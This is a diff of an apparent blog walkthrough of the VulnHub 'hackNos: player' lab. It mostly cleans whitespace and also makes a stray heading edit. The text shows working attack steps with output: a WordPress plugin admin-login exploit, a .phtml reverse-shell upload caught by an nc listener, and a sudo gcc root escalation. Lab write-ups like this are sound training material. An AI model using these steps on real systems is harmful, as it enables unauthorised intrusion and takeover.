@@ -1,6 +1,7 @@
 <html lang="en">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>
 /f0c1s/blog/sec/vulnhub/hackNos-player-1.1
 </title>
@@ -13,10 +14,10 @@
 <h1>
 /f0c1s/blog/sec/vulnhub/hackNos-player-1.1
 </h1>
-<p>
+<nav>
 <a href="../../../index.html">/blog</a> <a href="../../index.html">Security</a> <a href="../index.html">VulnHub</a> <a href="../../../sec/vulnhub/hackNos-player-1.1/hackNos-player-1.1.html">+ hackNos: player v1.1 - 2021.12.30 Thursday</a>
-</p>
-<h2 id="description">Description</h2>
+</nav>
+<h2 id="descriptiontttr">DescriptionTTTR</h2>
 <blockquote>
 <p>Difficulty: Intermediate</p>
 <p>Learning: Web Application | Enumerate | Good Enumeration | Privilege Escalation</p>
@@ -37,19 +38,19 @@
 192.168.56.2
 192.168.56.70
 192.168.56.85
-                                                                                                                                                                                                                                           </code></pre>
+</code></pre>
 <p>Alternatively:</p>
 <pre class="shell"><code>sudo netdiscover -r 192.168.56.1/24 -i eth1
- 
- Currently scanning: Finished!   |   Screen View: Unique Hosts                                                    
-                                                                                                                  
- 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                  
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
  _____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
  -----------------------------------------------------------------------------
- 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                 
- 192.168.56.2    08:00:27:f7:0e:49      1      60  PCS Systemtechnik GmbH                                         
- 192.168.56.85   08:00:27:ed:b6:00      1      60  PCS Systemtechnik GmbH                                         
+ 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
+ 192.168.56.2    08:00:27:f7:0e:49      1      60  PCS Systemtechnik GmbH
+ 192.168.56.85   08:00:27:ed:b6:00      1      60  PCS Systemtechnik GmbH
 </code></pre>
 <pre class="shell"><code>sudo netdiscover -r 192.168.56.1/24 -i eth1 -PN
  192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor
@@ -57,7 +58,7 @@
  192.168.56.85   08:00:27:ed:b6:00      1      60  PCS Systemtechnik GmbH
 
 -- Active scan completed, 3 Hosts found.
-                                                                                                                   </code></pre>
+</code></pre>
 <pre class="shell"><code>sudo arp-scan -I eth1 -l
 Interface: eth1, type: EN10MB, MAC: 08:00:27:13:e5:7a, IPv4: 192.168.56.70
 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -67,7 +68,7 @@ Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
 
 3 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.9.7: 256 hosts scanned in 1.980 seconds (129.29 hosts/sec). 3 responded
-                                                                                                                   </code></pre>
+</code></pre>
 <p>OR even simple nmap would have sufficed</p>
 <pre class="shell"><code>nmap 192.168.56.1/24 -sn -n
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-30 11:16 IST
@@ -76,13 +77,13 @@ Host is up (0.00098s latency).
 Nmap scan report for 192.168.56.85
 Host is up (0.0017s latency).
 Nmap done: 256 IP addresses (2 hosts up) scanned in 2.45 seconds
-                                                                                                                   </code></pre>
+</code></pre>
 <p>Setting up the IPs and ports.</p>
-<pre class="shell"><code>export RHOST=&quot;192.168.56.85&quot;    
+<pre class="shell"><code>export RHOST=&quot;192.168.56.85&quot;
 export LHOST=&quot;192.168.56.70&quot;
 export LPORT=&quot;443&quot;
 </code></pre>
-<pre class="shell"><code>_n $RHOST  
+<pre class="shell"><code>_n $RHOST
 firing nmap 192.168.56.85 | tee nmap.default.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:25 IST
 Nmap scan report for 192.168.56.85
@@ -93,7 +94,7 @@ PORT     STATE SERVICE
 3306/tcp open  mysql
 
 Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
-                                                                                                                                                                                                                                           </code></pre>
+</code></pre>
 <pre class="shell"><code>_ntd $RHOST
 firing nmap 192.168.56.85 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:25 IST
@@ -105,7 +106,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: Apache2 Debian Default Page: It works
 |_http-server-header: Apache/2.4.38 (Debian)
 3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
-| mysql-info: 
+| mysql-info:
 |   Protocol: 10
 |   Version: 5.5.5-10.3.18-MariaDB-0+deb10u1
 |   Thread ID: 39
@@ -117,9 +118,9 @@ PORT     STATE SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
-                                                                                                                                                                                                                                           </code></pre>
+</code></pre>
 <pre class="shell"><code>sudo nmap $RHOST -n -p80,3306 -Pn -T4 --min-rate=5000 --top-ports=100 -sVC -A --script=*enum* | tee nmap.deep-enum.txt
-[sudo] password for f0c1s: 
+[sudo] password for f0c1s:
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:26 IST
 Nmap scan report for 192.168.56.85
 Host is up (0.00088s latency).
@@ -128,8 +129,8 @@ PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
 |_http-server-header: Apache/2.4.38 (Debian)
 3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
-| mysql-enum: 
-|   Valid usernames: 
+| mysql-enum:
+|   Valid usernames:
 |     root:&lt;empty&gt; - Valid credentials
 |     netadmin:&lt;empty&gt; - Valid credentials
 |     guest:&lt;empty&gt; - Valid credentials
@@ -155,8 +156,8 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
-                                                                                                                                                                                                                                           </code></pre>
-<pre class="shell"><code>sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt               
+</code></pre>
+<pre class="shell"><code>sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=100 -sU --open | tee nmap.udp.top-100.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 15:26 IST
 Nmap scan report for 192.168.56.85
 Host is up (0.00045s latency).
@@ -165,7 +166,7 @@ Not shown: 94 open|filtered udp ports (no-response), 6 closed udp ports (port-un
 MAC Address: 08:00:27:ED:B6:00 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
-                                                                                                                                                                                                                                           </code></pre>
+</code></pre>
 <pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -179,7 +180,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
 + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
 + Server may leak inodes via ETags, header found with file /, inode: 2962, size: 59d6a8bf07689, mtime: gzip
-+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
 + OSVDB-3233: /icons/README: Apache default file found.
 + 26522 requests: 0 error(s) and 6 item(s) reported on remote host
 + End Time:           2021-12-28 15:28:05 (GMT5.5) (85 seconds)
@@ -189,7 +190,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
 <pre class="shell"><code>dirb http://$RHOST
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -199,23 +200,23 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://192.168.56.85/ ----
-+ http://192.168.56.85/index.html (CODE:200|SIZE:10594)                                                           
-==&gt; DIRECTORY: http://192.168.56.85/javascript/                                                                   
-+ http://192.168.56.85/server-status (CODE:403|SIZE:278)                                                          
-                                                                                                                  
++ http://192.168.56.85/index.html (CODE:200|SIZE:10594)
+==&gt; DIRECTORY: http://192.168.56.85/javascript/
++ http://192.168.56.85/server-status (CODE:403|SIZE:278)
+
 ---- Entering directory: http://192.168.56.85/javascript/ ----
-==&gt; DIRECTORY: http://192.168.56.85/javascript/jquery/                                                            
-                                                                                                                  
+==&gt; DIRECTORY: http://192.168.56.85/javascript/jquery/
+
 ---- Entering directory: http://192.168.56.85/javascript/jquery/ ----
-+ http://192.168.56.85/javascript/jquery/jquery (CODE:200|SIZE:271809)                                            
-                                                                                                                  
++ http://192.168.56.85/javascript/jquery/jquery (CODE:200|SIZE:271809)
+
 -----------------
 END_TIME: Tue Dec 28 15:31:52 2021
 DOWNLOADED: 13836 - FOUND: 3
-                                                                                                                   </code></pre>
+</code></pre>
 <pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
 301        9l       28w      319c http://192.168.56.85/javascript
 🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_85-1640685782.state ...
@@ -224,8 +225,8 @@ Scanning: http://192.168.56.85/javascript</code></pre>
 <figure>
 <img src="1.forbidden.png" alt="" /><figcaption>1.forbidden</figcaption>
 </figure>
-<pre class="shell"><code>mysql -h $RHOST -u root  -p               
-Enter password: 
+<pre class="shell"><code>mysql -h $RHOST -u root  -p
+Enter password:
 ERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;192.168.56.70&#39;</code></pre>
 <figure>
 <img src="2.hiding-in-plain-sight.png" alt="" /><figcaption>2.hiding-in-plain-sight</figcaption>
@@ -233,7 +234,7 @@ ERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;192.168.56.70&#39
 <figure>
 <img src="3.go-web.png" alt="" /><figcaption>3.go-web</figcaption>
 </figure>
-<pre class="shell"><code>wpscan --url http://192.168.56.85/g@web/ --api-token=&quot;$WP_API_TOKEN&quot; --enumerate ap,at,cb,dbe,u          
+<pre class="shell"><code>wpscan --url http://192.168.56.85/g@web/ --api-token=&quot;$WP_API_TOKEN&quot; --enumerate ap,at,cb,dbe,u
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -590,8 +591,8 @@ Interesting Finding(s):
 [+] Data Received: 3.731 MB
 [+] Memory used: 303.641 MB
 [+] Elapsed time: 00:00:20
-                                                                                                                   </code></pre>
-<pre class="shell"><code>feroxbuster -q -u http://192.168.56.85/g@web/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k          
+</code></pre>
+<pre class="shell"><code>feroxbuster -q -u http://192.168.56.85/g@web/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
 301        9l       28w      325c http://192.168.56.85/g@web/wp-content
 301        9l       28w      332c http://192.168.56.85/g@web/wp-content/themes
 301        9l       28w      333c http://192.168.56.85/g@web/wp-content/uploads
@@ -619,26 +620,26 @@ Scanning: http://192.168.56.85/g@web/
 Scanning: http://192.168.56.85/g@web/wp-content
 Scanning: http://192.168.56.85/g@web/wp-includes
 Scanning: http://192.168.56.85/g@web/wp-admin
-                                                                                                                   </code></pre>
-<pre class="shell"><code>gobuster dir --url http://$RHOST/g@web -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q 
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/g@web -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q
 /index.php            (Status: 301) [Size: 0] [--&gt; http://192.168.56.85/g@web/]
 /wp-content           (Status: 301) [Size: 325] [--&gt; http://192.168.56.85/g@web/wp-content/]
-/wp-login.php         (Status: 200) [Size: 4660]                                            
-/license.txt          (Status: 200) [Size: 19935]                                           
+/wp-login.php         (Status: 200) [Size: 4660]
+/license.txt          (Status: 200) [Size: 19935]
 /wp-includes          (Status: 301) [Size: 326] [--&gt; http://192.168.56.85/g@web/wp-includes/]
-/wp-trackback.php     (Status: 200) [Size: 135]                                              
-/wp-admin             (Status: 301) [Size: 323] [--&gt; http://192.168.56.85/g@web/wp-admin/]   
-/xmlrpc.php           (Status: 405) [Size: 42]                                               
+/wp-trackback.php     (Status: 200) [Size: 135]
+/wp-admin             (Status: 301) [Size: 323] [--&gt; http://192.168.56.85/g@web/wp-admin/]
+/xmlrpc.php           (Status: 405) [Size: 42]
 /wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://192.168.56.85/g@web/wp-login.php?action=register]
-                                                                                                                   </code></pre>
-<pre class="shell"><code>ffuf -u http://$RHOST/g@web/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 | grep -vi &quot;Size: 0&quot;    
+</code></pre>
+<pre class="shell"><code>ffuf -u http://$RHOST/g@web/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 | grep -vi &quot;Size: 0&quot;
 
-        /&#39;___\  /&#39;___\           /&#39;___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v1.3.1 Kali Exclusive &lt;3
 ________________________________________________
@@ -659,14 +660,14 @@ wp-trackback            [Status: 200, Size: 135, Words: 11, Lines: 5]
 wp-links-opml           [Status: 200, Size: 230, Words: 12, Lines: 12]
 xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1]
 :: Progress: [107982/107982] :: Job [1/1] :: 3544 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
-                                                                                                                   </code></pre>
+</code></pre>
 <pre class="shell"><code>ffuf -u http://$RHOST/g@web/FUZZ.txt -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 -s | grep -vi &quot;Size: 0&quot;
 license
 
-                                                                                                                   </code></pre>
+</code></pre>
 <pre class="shell"><code>ffuf -u http://$RHOST/g@web/FUZZ.js -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 -s
 
-                                                                                                                   </code></pre>
+</code></pre>
 <figure>
 <img src="4.hidden-responsive-ticket-system.png" alt="" /><figcaption>4.hidden-responsive-ticket-system</figcaption>
 </figure>
@@ -700,7 +701,7 @@ WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection 
 --------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 Papers: No Results
-                                                                                                                   </code></pre>
+</code></pre>
 <pre class="shell"><code>searchsploit -m php/webapps/41006.txt
   Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
       URL: https://www.exploit-db.com/exploits/41006
@@ -708,9 +709,9 @@ Papers: No Results
 File Type: ASCII text
 
 Copied to: /home/f0c1s/vuln-hubs/hackNos/player-1.1/41006.txt
-                                                                                                                   </code></pre>
+</code></pre>
 <h3 id="exploit-to-get-admin-access">exploit to get admin access</h3>
-<pre class="shell"><code>cat 41006.txt                  
+<pre class="shell"><code>cat 41006.txt
 # Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
 # Date: 10-01-2017
 # Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
@@ -734,7 +735,7 @@ http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege
         &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
 &lt;/form&gt;
 
-Then you can go to admin panel.                                                                                                                   </code></pre>
+Then you can go to admin panel.</code></pre>
 <h4 id="get-cookies">Get cookies</h4>
 <pre class="shell"><code>curl -v -X POST -d &#39;username=wp-local&amp;email=sth&amp;action=loginGuestFacebook&#39;  http://192.168.56.85/g@web/wp-admin/admin-ajax.php
 Note: Unnecessary use of -X or --request, POST is already inferred.
@@ -746,7 +747,7 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 &gt; Accept: */*
 &gt; Content-Length: 53
 &gt; Content-Type: application/x-www-form-urlencoded
-&gt; 
+&gt;
 * Mark bundle as not supporting multiuse
 &lt; HTTP/1.1 200 OK
 &lt; Date: Tue, 28 Dec 2021 11:22:40 GMT
@@ -762,12 +763,12 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 &lt; Set-Cookie: wordpress_logged_in_c2c223ba385e99f28ec25035b2629d7a=wp-local%7C1640863360%7CwXcFLLTB8msCvhmMa68Sr68BFwzvS9SiibTpCr7PSXs%7C0cf54612721bb8b61f5659417cb2830674672bc351c90e38f45fbbd4a5382319; path=/g@web/; HttpOnly
 &lt; Content-Length: 0
 &lt; Content-Type: text/html; charset=UTF-8
-&lt; 
+&lt;
 * Connection #0 to host 192.168.56.85 left intact
-                                                                                                                   </code></pre>
+</code></pre>
 <h4 id="create-a-web-page-and-do-this-from-web">Create a web page and do this from web</h4>
 <p>It is just a bit easier.</p>
-<pre class="shell"><code>cat get-login.html  
+<pre class="shell"><code>cat get-login.html
 &lt;p&gt;The admin is wp-local, we know this from wpscan&lt;/p&gt;
 
 &lt;form method=&quot;post&quot; action=&quot;http://192.168.56.85/g@web/wp-admin/admin-ajax.php&quot;&gt;
@@ -777,7 +778,7 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
         &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
 &lt;/form&gt;
 
-                                                                                                                   </code></pre>
+</code></pre>
 <figure>
 <img src="7.before-attack.png" alt="" /><figcaption>7.before-attack</figcaption>
 </figure>
@@ -826,14 +827,14 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 <span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a>    <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;file&quot;</span><span class="ot"> name=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span></span>
 <span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a>    <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value=</span><span class="st">&quot;Submit&quot;</span><span class="kw">&gt;</span></span>
 <span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a><span class="kw">&lt;/form&gt;</span></span></code></pre></div>
-<pre class="shell"><code>cat upload-rshell.html 
+<pre class="shell"><code>cat upload-rshell.html
 &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://192.168.56.85/g@web/wp-admin/admin-ajax.php&quot;&gt;
     &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;wpsp_upload_attachment&quot;&gt;
     Choose a file ending with .phtml:
     &lt;input type=&quot;file&quot; name=&quot;0&quot;&gt;
     &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
 &lt;/form&gt;
-                                                                                                                   </code></pre>
+</code></pre>
 <figure>
 <img src="9.before-upload.png" alt="" /><figcaption>9.before-upload</figcaption>
 </figure>
@@ -872,8 +873,8 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 
 ## this worked
 curl http://192.168.56.85/g@web/wp-content/uploads/wpsp/1640691390_rshell.phtml</code></pre>
-<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST 
-[sudo] password for f0c1s: 
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+[sudo] password for f0c1s:
 Listening on 192.168.56.70 443
 Connection received on 192.168.56.85 40084
 Linux hacknos 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
@@ -1109,7 +1110,7 @@ select user_login, user_pass, user_email from wp_users;
 <p>We alread have it.</p>
 <pre class="shell"><code>MariaDB [hackNos]&gt; select * from wp_usermeta;
 ...
-| 4 | 1 | description | you can upgrade you shell using hackNos@9012!! |  
+| 4 | 1 | description | you can upgrade you shell using hackNos@9012!! |
 ...</code></pre>
 <figure>
 <img src="12.upgrade-message.png" alt="" /><figcaption>12.upgrade-message</figcaption>
@@ -1201,7 +1202,7 @@ Matching Defaults entries for hunter on hacknos:
 
 User hunter may run the following commands on hacknos:
     (ALL) NOPASSWD: /usr/bin/gcc
-hunter@hacknos:/var/www/html$ 
+hunter@hacknos:/var/www/html$
 
 hunter@hacknos:/var/www/html$ sudo gcc -wrapper /bin/sh,-s .
 
